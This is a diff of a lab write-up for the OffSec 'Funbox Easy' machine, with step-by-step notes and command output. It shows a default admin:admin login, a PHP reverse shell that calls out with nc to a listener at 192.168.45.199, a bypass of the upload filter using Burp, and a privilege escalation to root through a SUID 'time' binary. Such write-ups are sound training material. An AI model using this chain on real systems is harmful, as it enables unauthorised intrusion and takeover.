@@ -147,10 +147,64 @@ Finished
 
 6) Checking out the `/store` path
 
-> admin login
+![](./assets/cse-bookstore.png)
 
-> add a new book
+7) Inspecting the page, I find at least part of the site acts as a file server...
 
+![](./assets/finding-image-folder.png)
+
+![](./assets/img-path.png)
+
+Interesting... These are all the book photos from before.
+
+I play around in the webserver's file system to see what we find. I find lots of documents, including some university project PDFs. I scan them for passwords but fid nothing useful. 
+
+7) Back at the CSE bookstore page (`/store`), we find an "Admin Login" link at the bottom right corner of the page, which takes us to a login screen...
+
+![](./assets/store-admin-login-link.png)
+
+![](./assets/admin-login.png)
+
+8) I try the credentials `admin:admin`... and that gets me in!
+
+![](./assets/store-admin-login.png)
+
+9) I check out the "Add new book" form...
+
+I notice I can upload an image, which would probably end up in the directory of very other image... and immediately this smells... I wonder if I can upload a reverse shell and get the server to execute it for me.
+
+![](./assets/add-book-form.png)
+
+10) I write my payload (a php reverse shell) in `rshell.php.jpg`:
+
+```
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.199 443 >/tmp/f");?>
+```
+
+11) I fire up burp-suite in proxy mode since I assume there will be some file extension validation on the client side. I will intercept the request and change the filename to `.php` once its passed the client side validation.
+
+![](./assets/intercept-caught.png)
+
+12) I press "Add new book", rename the file from `rshell.php.jpg` to `rshell.php` in the request and forward it, however I encounter a few errors which give away some database columns... (we can try SQL injection if this doesn't work)
+
+![](./assets/sql-errors-1.png)
+![](./assets/sql-errors-2.png)
+
+12) I try a smaller price, and publisher ID 0. The publisher ID issue was still there, so I tried a publisher that was the publisher value for other books: `O'Reilly Media`. I submit the request, intercept it, change the filename, and forward it again.
+
+This time it went through!
+
+And we see our "book" in the admin page:
+
+![](./assets/my-book.png)
+
+13) We set up a local listener in the port that our reverse shell will talk to (443), and go looking for our `.php` file where we expect to find it (the `/store/bootstrap/img` path):
+
+![](./assets/rshell-in-img-folder.png)
+
+It's there!
+
+14) As soon as we click on it, we get a reverse shell in our local listener (as user `www-data`).
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/upload-me]
@@ -163,7 +217,7 @@ www-data
 $ 
 ```
 
-Eventually find access flag
+15) Dig around abit and eventually find the access flag
 
 ```
 $ pwd
@@ -178,7 +232,7 @@ $ cat local.txt
 4020a37711a5c3c7e130e97deaa0b0d6
 ```
 
-Find tony's password:
+16) Digging around a little longer and we notice that we can read user `tony`'s home directory, including a file `password.txt` with some goodies:
 
 ```
 $ cd /home
@@ -200,7 +254,7 @@ gym/admin: asdfghjklXXX
 /store: admin@admin.com admin
 ```
 
-we are tony
+17) I choose to ditch our shell as `www-data` and move on to become `tony`, logging in through the front door (the ssh server on port 22):
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/src/offsec/vpn_profiles]
@@ -213,53 +267,34 @@ Warning: Permanently added 'funboxeasy' (ED25519) to the list of known hosts.
 tony@funboxeasy's password: 
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Mon Mar  4 03:55:58 UTC 2024
-
-  System load:  0.09              Processes:               159
-  Usage of /:   77.3% of 4.66GB   Users logged in:         0
-  Memory usage: 62%               IPv4 address for ens256: 192.168.184.111
-  Swap usage:   0%
-
-  => There is 1 zombie process.
-
-
-60 updates can be installed immediately.
-0 of these updates are security updates.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-To run a command as administrator (user "root"), use "sudo <command>".
-See "man sudo_root" for details.
+        (... welcome banner hidden for brevity ...)
 
 tony@funbox3:~$
 ```
 
-time has suid
+## Privilege Escalation
 
-https://gtfobins.github.io/gtfobins/time/#suid
+18) I check for binaries with the SUID bit and find that among others, the `time` binary has SUID.
 
 ```
-tony@funbox3:/$ ls -la /usr/bin/time
+tony@funbox3:/$ ls -la /usr/bin | grep 'rws'
+ 
+        (... output hidden for brevity ...)
+
 -rwsr-xr-x 1 root root 14720 Apr 21  2017 /usr/bin/time
+```
+
+GTFOBins tells us we can abuse this: https://gtfobins.github.io/gtfobins/time/#suid
+
+19) I become root by abusing the `time` binary:
+
+```
 tony@funbox3:/$ /usr/bin/time /bin/bash -p
 bash-5.0# whoami
 root
 ```
+
+20) We find our flag where we expect to find it:
 
 ```
 bash-5.0# ls -la /root | grep -e proof -e txt
@@ -268,9 +303,9 @@ bash-5.0# cat /root/proof.txt
 f5e7058e15f70b64233565b76acc66ef
 ```
 
-Note that we never actually needed to be tony to get root. We could have just executed `/usr/bin/time bash -p` as `www-data` and we would've gotten root. 
+We are done here! Note that we never actually needed to be `tony` to get root. We could have just executed `/usr/bin/time bash -p` as `www-data` (and we would've gotten root). 
 
-
----
-
-Lesson: ALWAYS check GTFOBins as soon as you know what binaries have SUID.
+> After being done I found online that "CSE Bookstore" actually has a few well-known exploits we could have abused instead of guessing the store's admin password and uploading a malicious payload. Looks like we could've fully bypassed authentication. See:
+> 
+> - https://www.exploit-db.com/exploits/47887
+> - https://www.exploit-db.com/exploits/48960
